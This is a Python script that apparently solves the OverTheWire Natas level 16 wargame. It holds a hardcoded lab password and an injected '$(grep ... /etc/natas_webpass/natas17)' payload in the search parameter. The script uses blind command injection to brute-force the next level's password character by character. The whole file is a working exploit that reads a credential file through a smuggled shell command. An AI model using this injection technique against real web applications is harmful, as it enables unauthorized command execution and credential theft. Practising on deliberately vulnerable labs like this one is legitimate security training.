import requests
import sys

url = "http://natas16.natas.labs.overthewire.org"
user = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
prefix = "doomed$(grep "
postfix = " /etc/natas_webpass/natas17)"
possible_chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
possible_leading_chars = '8'
solution = '8Ps3H'

def tryPassword(needle_param):
    resp = requests.get(url, params={"needle": needle_param, "submit": "Search"}, auth=(user, password))
    if 'doomed' not in resp.content:
        return True
    else:
        return False

def tryForOneChar(solution, chars):
     for char in chars:
        trial_solution = solution + char
        needle_param = prefix + trial_solution + postfix
        result = tryPassword(needle_param)
        if result:
            return char
     return False

#leading_char = tryForOneChar(solution, possible_leading_chars)
#if leading_char == False:
#    print('Failed to pick leading char')
#    sys.exit()
#else:
#    print('Picked leading char: ' + leading_char)
#    solution = solution + leading_char
while len(solution) < 32:
    new_char = tryForOneChar(solution, possible_chars)
    if new_char == False:
        print('Failed to pick new char, solution so far: ' + solution)
        sys.exit()
    else:
        solution = solution + new_char
        print('new solution: ' + solution)
